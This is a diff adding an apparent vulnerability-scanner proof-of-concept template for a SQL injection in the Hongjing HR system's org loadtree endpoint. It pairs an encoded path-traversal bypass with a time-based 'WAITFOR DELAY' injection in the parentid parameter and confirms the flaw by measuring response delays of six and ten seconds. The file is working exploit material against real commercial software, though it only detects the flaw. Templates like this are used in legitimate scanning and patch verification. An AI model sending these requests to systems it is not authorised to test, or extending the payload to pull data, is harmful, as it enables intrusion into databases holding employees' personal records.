@@ -1,0 +1,26 @@
+name: poc-yaml-hongjingeHR-common_org_loadtree-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A6%27--&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.status == 200 && response.latency >= 6000 && response.latency <= 7000
+  r1:
+    request:
+      method: GET
+      path: /w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A10%27--&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+    expression: response.status == 200 && response.latency >= 10000 && response.latency <= 11000
+expression: r0() && r1()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140247342
